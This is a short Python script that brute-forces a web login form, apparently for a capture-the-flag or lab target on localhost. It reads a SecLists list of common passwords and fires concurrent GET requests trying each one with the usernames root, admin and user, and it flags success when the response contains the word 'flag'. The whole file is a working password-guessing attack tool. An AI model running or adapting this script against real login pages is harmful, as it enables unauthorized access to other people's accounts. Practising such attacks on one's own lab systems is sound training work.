import aiohttp
import asyncio

PASSWORDS_FILE = (
    "SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt"
)
TARGET_URL = "http://localhost:8080/index.php"
TIMEOUT_SECONDS = 5


async def attempt_login(session, username, password):
    params = {
        "page": "signin",
        "username": username,
        "password": password,
        "Login": "Login",
    }

    try:
        async with session.get(
            TARGET_URL, params=params, timeout=TIMEOUT_SECONDS
        ) as response:
            text = await response.text()
            print(username, password)
            if "flag" in text:
                print(f"[SUCCESS] Username: {username} | Password: {password}")
    except asyncio.TimeoutError:
        print(f"[TIMEOUT] Username: {username} | Password: {password}")


async def brute_force():
    usernames = ["root", "admin", "user"]
    passwords = [line.strip() for line in open(PASSWORDS_FILE).readlines()]

    timeout = aiohttp.ClientTimeout(
        total=None, sock_connect=TIMEOUT_SECONDS, sock_read=TIMEOUT_SECONDS
    )
    async with aiohttp.ClientSession(timeout=timeout) as session:
        tasks = [
            attempt_login(session, username, password)
            for username in usernames
            for password in passwords
        ]
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(brute_force())
